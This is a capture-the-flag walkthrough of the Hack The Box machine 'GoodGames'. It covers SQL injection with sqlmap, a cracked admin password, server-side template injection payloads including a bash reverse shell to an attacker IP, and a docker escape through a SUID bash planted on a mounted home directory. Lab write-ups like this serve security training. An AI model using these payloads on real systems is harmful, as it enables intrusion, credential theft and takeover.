# **Machine Info**

| OS        | Linux    |
| --------- | -------- |
| **Level** | **Easy** |


# **Walkthrough**
**Enumeration**
1. Scaning the port and found only port 80 open.
```
	┌─[ghoth@parrot]─[~/HTB/machines/goodGames]
	└──╼ $sudo nmap -p- --min-rate=10000 -oA portScan 10.10.11.130
	[sudo] password for ghoth: 
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 02:01 +0545
	Nmap scan report for 10.10.11.130
	Host is up (0.21s latency).
	Not shown: 65534 closed tcp ports (reset)
	PORT   STATE SERVICE
	80/tcp open  http
			
	Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds

```
2. Further service and version along with Operating System enumeration with aggressive scan on the open port of target machine.
```
	┌─[✗]─[ghoth@parrot]─[~/HTB/machines/goodGames]
	└──╼ $sudo nmap -p80 -sC -sV -O -T4 -oA serviceScan 10.10.11.130
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 02:10 +0545
	Nmap scan report for 10.10.11.130
	Host is up (0.21s latency).
	
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.51
	|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
	|_http-title: GoodGames | Community and Store
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Linux 5.X
	OS CPE: cpe:/o:linux:linux_kernel:5.0
	OS details: Linux 5.0
	Network Distance: 2 hops
	Service Info: Host: goodgames.htb
	
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 15.61 seconds
```

3.  The website seem to be related to game posts. 
	- ![](Assets/Pasted%20image%2020250305024900.png)

4. The blog redirected to "/blog", which contains posts. All the blog post seem return to home page, except second post "/blog/1".   
	- ![](Assets/Pasted%20image%2020250305030845.png)
	- There was also comment section with 2 comment by admin but comment the post show "500 internal server error".
	- ![](Assets/Pasted%20image%2020250305031216.png)

5. The store lead to "/coming-soon" page which should the now ended countdown. The subscribe button does nothing when email is entered.
	- ![](Assets/Pasted%20image%2020250305032016.png)


**SQL Injection**

6. Checking for SQL injection in login area. It seem that it is checks email format. Then i intercept the request and in repeater tried the sql injection again which was a success and i got admin access.
	- ![](Assets/Pasted%20image%2020250307203935.png)

7. I then added the email "admin@goodgames.htb" back and save the request in "goodgame.req" file to further enumerate using sqlmap.
	- `sqlmap -r goodgame.req`
	- ![](Assets/Pasted%20image%2020250310015214.png)

8. Enumerating Database and Table:
	- `sqlmap -r goodgame.req --dbs`
	- ![](Assets/Pasted%20image%2020250310015920.png)

	- Enumerating database "main" for its table:
	- `sqlmap -r goodgame.req -D main --tables`
	- ![](Assets/Pasted%20image%2020250310021106.png)

9. Dumping the information from user table in main database:
	- `sqlmap -r goodgame.req -D main -T user --dump`
	- ![](Assets/Pasted%20image%2020250310022821.png)
10. I then look for the hash found that it was MD5 hash and was easily cracked.
	- ![](Assets/Pasted%20image%2020250310022942.png)
	- password = `superadministrator`

11. We got the password. The cog wheel icon in /profile lead to new subdomain. Then, i added the domain and subdomain in /etc/hosts, which lead to new login page.
	- ![](Assets/Pasted%20image%2020250310023656.png)

12. Login with admin username and the password we cracked, we were redirected to new dashboard.
	- ![](Assets/Pasted%20image%2020250310023936.png)

**SSTL (Server Side Template Injection)**

13. In the setting, we discover the option to update Full Name as there is python flask running in backend, i try the SSTL injection  `{{7*7}}` and the name  change to `49`.
	- ![](Assets/Pasted%20image%2020250310031450.png)

14. It is SSTL vulnerable, now checking by inputting the payload whether it works or not.
	- `{{ namespace.__init__.__globals__.os.popen('id').read() }}`
	- ![](Assets/Pasted%20image%2020250310033150.png)

15. System command also works, now its time for reverse shell.
	- `{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.13/8888 0>&1"').read() }}
	- ![](Assets/Pasted%20image%2020250310033446.png)
16. Andddd we got the user flag.
	- ![](Assets/Pasted%20image%2020250310034223.png)

**Docker Escape**

17. We are inside a docker container. How? due to following reasons:
	1. We are root user when we got the shell.
	2. There is `.dockerenv` file in root directory.
		- ![](Assets/Pasted%20image%2020250310035426.png)
	2. In the ownership of the files in `augustus` home directory, it has UID instead of the name and there is no user `augustus` or user `1000`
		- ![](Assets/Pasted%20image%2020250310035714.png)
		- ![](Assets/Pasted%20image%2020250310035909.png)
	3. This hints that the user's home directory is mounted inside the docker container.
		- ![](Assets/Pasted%20image%2020250310040329.png)

18. The ifconfig show that the ip is `172.19.0.2`. Docker usually assign the first address to the subnet to the host system configuration.
	 - ![](Assets/Pasted%20image%2020250310040934.png)
	 - Next is the port scan, since the nmap is not installed in the target machine, we will use Bash. And found 2 port (22 and 80) open.
		 - `for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done`
		 - ![](Assets/Pasted%20image%2020250310041300.png)
		- 22 is SSH and 80 is running website which can be confirm after curl.

19. We try to SSH into the user with the same password `superadministrator` we crack after dumping database. And it actually work. The password was reused in multiple authentication. Before SSH, we upgrade our non-interactive shell to new interactive shell session.
	- ![](Assets/Pasted%20image%2020250310042506.png)

**Privilege Escalation**
20. With information we have, we know that the host (augustus) is mounted into the docker container. So, if we write a file and change their permission to root from within the container, then the same permission is shown looking from users shell.
	- We then copy /bin/bash  file of augustus into his home directory and change the ownership to root and apply the SUID permission on that bash file.
	- ![](Assets/Pasted%20image%2020250310044032.png)
	- ![](Assets/Pasted%20image%2020250310044052.png)

21. We SSH back into the user augustus. Now, the bash file is owned by root and has SUID permission. Executing the bash and spawning the shell, we get root privilege. 
	- ![](Assets/Pasted%20image%2020250310044545.png)